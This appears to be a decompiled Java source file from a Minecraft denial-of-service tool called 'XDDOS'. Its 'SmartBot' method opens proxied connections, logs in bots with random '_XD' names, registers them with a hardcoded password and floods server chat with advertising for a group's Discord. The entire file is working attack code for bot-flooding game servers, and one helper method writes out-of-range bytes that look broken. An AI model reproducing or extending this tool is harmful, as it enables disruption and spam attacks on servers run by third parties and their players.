    package XD.XDDOS.methods.impl;

    import XD.XDDOS.XDDOS;
import XD.XDDOS.methods.IMethod;
import XD.XDDOS.utils.NettyBootstrap;
import XD.XDDOS.utils.helper.RandomUtils;
import XD.XDDOS.utils.packet.Handshake;
import XD.XDDOS.utils.packet.LoginRequest;
import XD.XDDOS.utils.packet.PacketUtils;
import XD.XDDOS.utils.proxy.ProxyLoader;
import io.netty.buffer.ByteBuf;
    import io.netty.buffer.ByteBufOutputStream;
    import io.netty.buffer.Unpooled;
    import io.netty.channel.Channel;
    import java.io.ByteArrayOutputStream;
    import java.io.DataOutputStream;
    import java.io.IOException;
    import java.security.SecureRandom;
    import java.util.concurrent.TimeUnit;
    import java.util.zip.Deflater;


    public class SmartBot

      implements IMethod{

      private byte[] handshake = (new Handshake(XDDOS.protcolID, XDDOS.srvRecord, XDDOS.port, 2)).getWrappedPacket();


      public void accept(Channel channel, ProxyLoader.Proxy proxy) {
        channel.writeAndFlush(Unpooled.buffer().writeBytes(this.handshake));
        ByteBuf b = Unpooled.buffer();
        ByteBufOutputStream bbbb = new ByteBufOutputStream(b);
        ByteBuf b2 = Unpooled.buffer();
        ByteBufOutputStream bbbb2 = new ByteBufOutputStream(b2);
        ByteBuf b3 = Unpooled.buffer();
        ByteBufOutputStream bbbb3 = new ByteBufOutputStream(b3);
        channel.writeAndFlush(Unpooled.buffer().writeBytes((new LoginRequest((new StringBuilder()).append(RandomUtils.randomString(8)).append("_XD").toString())).getWrappedPacket()));
        channel.writeAndFlush(b);
        channel.writeAndFlush(bbbb);
        try {
          try {
            TimeUnit.MILLISECONDS.sleep(1500L);
          }
          catch (InterruptedException e) {
            e.printStackTrace();
          }
          for (int l = 0; l < 3; l++) {
            writePacket(compress(PacketUtils.createChatPacket("/register Sexy6969 Sexy6969"), 0), bbbb3);
            writePacket(compress(PacketUtils.createChatPacket("/register Sexy6969"), 0), bbbb3);
            writePacket(compress(PacketUtils.createChatPacket("/login Sexy6969"), 0), bbbb3);
          }

        } catch (IOException ioException) {
          ioException.printStackTrace();
        }
        channel.writeAndFlush(b3);
        channel.writeAndFlush(bbbb3);
        try {
          TimeUnit.MILLISECONDS.sleep(500L);
        }
        catch (InterruptedException e) {
          e.printStackTrace();
        }
        try {
          for (int l = 0; l < 3; l++) {
            writePacket(compress(PacketUtils.createChatPacket("-" + (new SecureRandom()).nextInt(9999) + "- TEAM XD ON TOP! - dsc . gg / teamxd -" + (new SecureRandom()).nextInt(9999) + "-"), 0), bbbb2);
          }
        }
        catch (IOException ioException) {
          ioException.printStackTrace();
        }
        channel.writeAndFlush(b2);
        channel.writeAndFlush(bbbb2);
        NettyBootstrap.totalConnections++;
      }

      public byte[] getdata() throws IOException {
        ByteArrayOutputStream bytes = new ByteArrayOutputStream();
        DataOutputStream out = new DataOutputStream(bytes);
        out.write(-15);
        out.write(0);
        out.write(-47);
        out.write(-9);
        out.writeBytes(XDDOS.srvRecord);
        out.write(-99);
        out.write(-224);
        out.write(-1);
        byte[] data = bytes.toByteArray();
        bytes.close();
        return data;
      }

      public byte[] compress(byte[] packet, int threshold) throws IOException {
        ByteArrayOutputStream bytes = new ByteArrayOutputStream();
        DataOutputStream out = new DataOutputStream(bytes);
        byte[] buffer = new byte[8192];
        if (packet.length >= threshold && threshold > 0) {
          byte[] data = new byte[packet.length];
          System.arraycopy(packet, 0, data, 0, packet.length);
          PacketUtils.writeVarInt(out, data.length);
          Deflater def = new Deflater();
          def.setInput(data, 0, data.length);
          def.finish();
          while (!def.finished()) {
            int i = def.deflate(buffer);
            out.write(buffer, 0, i);
          }
          def.reset();
        } else {
          PacketUtils.writeVarInt(out, 0);
          out.write(packet);
        }
        out.close();
        return bytes.toByteArray();
      }

      public static void writePacket(byte[] packetData, ByteBufOutputStream out) throws IOException {
        writeVarInt(packetData.length, out);
        out.write(packetData);
      }

      public static void writeVarInt(int value, ByteBufOutputStream out) throws IOException {
        while ((value & 0xFFFFFF80) != 0) {
          out.writeByte(value & 0x7F | 0x80);
          value >>>= 7;
        }
        out.writeByte(value);
        NettyBootstrap.integer++;
        NettyBootstrap.totalConnections++;
      }
    }


